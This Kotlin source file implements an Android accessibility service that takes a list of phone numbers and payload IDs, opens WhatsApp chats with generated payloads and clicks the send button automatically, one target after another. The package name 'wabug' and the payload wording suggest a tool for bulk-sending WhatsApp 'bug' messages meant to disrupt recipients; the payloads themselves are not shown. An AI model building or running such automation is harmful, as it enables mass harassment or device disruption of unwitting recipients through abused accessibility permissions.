package com.example.wabug
import android.accessibilityservice.AccessibilityService
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
class WAAutoService : AccessibilityService() {
    data class Job(val number: String, val payloadId: String, val pkg: String)
    companion object {
        @Volatile var instance: WAAutoService? = null
        @Volatile var delayMs = 3000L
        private val queue = ArrayDeque<Job>()
        private var awaitingSend = false
        fun enqueue(jobs: List<Job>) {
            queue.clear(); jobs.forEach { queue.addLast(it) }
            awaitingSend = false; fireNext()
        }
        private fun fireNext() {
            val job = queue.removeFirstOrNull() ?: return
            val payload = Payloads.get(job.payloadId)?.gen?.invoke() ?: "x"
            if (Sender.open(job.number, payload, job.pkg) && instance != null) {
                awaitingSend = true
                Handler(Looper.getMainLooper()).postDelayed({ awaitingSend = false; fireNext() }, 8000L)
            } else { Handler(Looper.getMainLooper()).postDelayed({ fireNext() }, delayMs) }
        }
    }
    override fun onServiceConnected() { super.onServiceConnected(); instance = this }
    override fun onDestroy() { if (instance == this) instance = null; super.onDestroy() }
    override fun onInterrupt() {}
    override fun onAccessibilityEvent(e: AccessibilityEvent?) {
        if (!awaitingSend) return
        val root = rootInActiveWindow ?: return
        if (root.packageName?.toString() != "com.whatsapp") return
        val btn = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/send").firstOrNull()
        if (btn != null && btn.performAction(AccessibilityNodeInfo.ACTION_CLICK)) { awaitingSend = false; fireNext() }
    }
}
